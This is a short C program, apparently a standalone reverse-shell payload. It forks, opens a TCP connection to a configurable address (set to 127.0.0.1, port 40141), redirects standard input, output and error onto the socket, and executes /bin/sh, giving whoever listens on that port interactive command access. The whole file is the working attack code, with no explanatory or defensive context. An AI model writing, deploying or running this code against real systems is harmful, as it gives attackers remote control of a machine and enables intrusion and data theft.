#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 40141
#define REMOTE_SHELL "/bin/sh"

int main(int argc, char *argv[]) {
    struct sockaddr_in sa;
    int s;
    fork();
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0); // stdin
    dup2(s, 1); // stdout
    dup2(s, 2); // stderr

    execve(REMOTE_SHELL, 0, 0);
    return 0;
}
